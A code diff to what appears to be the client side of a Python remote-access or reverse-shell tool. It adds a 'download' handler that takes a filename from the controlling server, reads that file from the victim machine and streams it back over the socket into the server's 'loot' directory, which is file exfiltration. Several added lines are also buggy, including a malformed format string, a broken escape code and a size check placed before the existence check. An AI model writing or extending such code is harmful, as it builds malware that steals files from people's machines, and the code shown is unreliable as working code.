@@ -42,7 +42,11 @@ class Client:
                 break
 
             if cmd.lower() == "download":
-                # The client "uploads" to the servers "loot" directory
+                # The client "uploads" to the servers "loot" directory.
+                # "filename": the file to download and pass on to the "Download" method
+                filename = sock.recv(self.buffer_size).decode()
+                # Download method...
+                _ClientMeta.download(sock=sock, filename=filename)
                 pass
 
             # What if the command is "cd" a two part command
@@ -66,6 +70,40 @@ class Client:
 
         sock.close()
 
+class _ClientMeta:
+
+    def __init__(self):
+        pass
+
+    @staticmethod
+    def download(sock, filename, sep="<sep>", buffer_size=4096):
+        filename = os.getcwd() + os.sep + filename
+        message = f"\033[33m[CLIENT.RESP]\033[37m Data stream established, checking for file %s...\033[0m".format("Invalid file..." if filename is None else filename)
+        sof = os.path.getsize(filename)
+
+        sock.send(message.encode())
+
+        if os.path.isfile(filename):
+            retm = f"\033[33[CLIENT.RESP]\033[37m File found, initializing download & sending basic file data...\033[0m"
+            sock.send(retm.encode())
+
+            sock.send(f"{filename}{sep}{sof}".encode())
+
+            # Begin the transfer
+            with open(filename, "r+") as data:
+                # Enter main transfer loop
+                while True:
+                    br = data.read(buffer_size)
+
+                    # The download is complete, send message back to server
+                    if not br:
+                        final = f"\033[33m[CLIENT.RESP]\033[37m Download complete, recvd {sof.real}...\033[0m"
+                        sock.send(final.encode())
+                        break
+
+                    sock.sendall(br)
+            # As always, close the socket
+            sock.close()
 
 def main():
     client = Client()
